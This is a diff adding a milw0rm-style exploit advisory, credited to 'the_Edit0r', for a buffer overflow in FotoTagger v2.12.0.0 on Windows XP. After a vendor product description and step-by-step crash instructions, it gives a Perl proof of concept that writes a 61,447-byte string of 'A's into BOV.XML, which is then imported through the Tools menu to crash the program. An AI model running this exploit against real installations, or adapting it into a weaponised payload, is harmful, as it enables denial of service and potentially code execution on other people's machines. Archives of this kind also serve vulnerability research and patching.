@@ -1,0 +1,63 @@
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+"""  :::::: ::   ::       ::        ::  ::  ::::        """
+"""  ::      :: ::        :: :::::: .. ::::   ::        """
+"""  :::::    :::   ::::: :: ::  :: ::  ::  ::::        """
+"""  ::      :: ::  ::  : :: ::  :: ::  ::    ::        """
+"""  :::::: ::   :: ::::: :: :::::: ::  ::  :::: rs.ir  """
+"""                 ::                                  """
+"""                                                     """
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+   Anti-Security Research Team & Security Institute
+
+#[+] Bug : FotoTagger v2.12.0.0 Buffer Overflow Vulnerabiltity
+#[+] program  Download : www.fototagger.com
+#[+] Author : the_Edit0r
+#[+] Contact me : the_3dit0r[at]Yahoo[dot]coM
+#[+] Greetz to all my friends
+#[+] Tested on: Windows XP Pro SP2 
+#[+] web site: Expl0iters.ir  * Anti-security.ir
+#[+] Big thnx: H4ckcity Member
+
+
+# Part Description :
+--------------------
+Description Program 
+FotoTagger is a free software tool for annotating JPEG images quickly and easily.
+Place on an image location-specific annotation notes that point to people or other elements.
+Identify people and objects. Mark notable details. Comment specific objects. Instantly
+find a particular person, object, or comment among image collections. Do you use Flickr?
+Annotate pictures with FotoTagger and upload them to your Flickr account in a few seconds.
+FotoTagger annotations are preserved and converted to Flickr notes so you can edit them by
+using Flickr online tools. You can also download images from Flickr with Flickr notes
+transformed to FotoTagger annotations and edit them with FotoTagger! Multiple image upload
+and download are supported. You can also enjoy other means for sharing annotated images.
+FotoTagger lets you publish annotated pictures to blogs at Blogger.com and LiveJournal,
+as well as share annotated images through Web and email. Annotations do not change an
+original image so moving and sharing files keep annotations intact.
+
+For More Explaination look at follow pictures.
+
+I. Clicking On File Perl
+http://expl0iters.ir/img/Foto1.jpg
+
+II.BOV.XML File Created Successfully
+http://expl0iters.ir/img/Foto2.jpg
+
+III.Run the Program FotoTagger & Go To Tools Mnue and Import tags from XML File ( include BOV.XML File ) 
+http://expl0iters.ir/img/Foto3.jpg
+http://expl0iters.ir/img/Foto4.jpg
+
+IV.Boom ...!!!
+
+
+# Part Expl0it & Bug Codes ( Poc ) : 
+------------------------------------
+#!/usr/bin/perl
+my $buffer = "A" x 61447;
+my $filename = "BOV.XML";
+open (FILE,">$filename") || die "\nCan't open $file: $!";
+print FILE "$buffer";
+close (FILE);
+print "\nSuccessfully!\n";
+
+# milw0rm.com [2009-09-14]
